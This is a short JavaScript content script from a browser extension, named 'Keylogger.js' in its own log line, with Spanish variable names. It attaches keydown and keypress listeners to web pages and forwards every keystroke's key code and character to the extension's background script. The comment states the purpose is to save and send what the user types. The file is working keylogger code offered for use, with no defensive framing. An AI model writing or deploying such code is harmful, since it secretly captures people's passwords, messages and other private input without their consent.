console.log("Keylogger.js extension go");

/*////////////////////////////////////////////////////////////////
                            Listeners
////////////////////////////////////////////////////////////////*/

//save and send key press by user
window.addEventListener('keydown' , keyloggerDown); 

window.addEventListener('keypress' , keyloggerPress); 

/*////////////////////////////////////////////////////////////////
                            Functions
////////////////////////////////////////////////////////////////*/

function keyloggerDown(key){
    let mensaje={
        txt: "keydown",
        keyCode: key.keyCode,
        charCode: key.charCode,
        which: key.which,
        chr: key.key
    }
        
    //console.log(mensaje);
    detectBrowser.runtime.sendMessage(mensaje);
   
}

function keyloggerPress(key){
    let mensaje={
        txt: "keypress",
        keyCode: key.keyCode,
        charCode: key.charCode,
        which: key.which,
        chr: key.key
    }

    //console.log(mensaje);
    detectBrowser.runtime.sendMessage(mensaje);
   
}
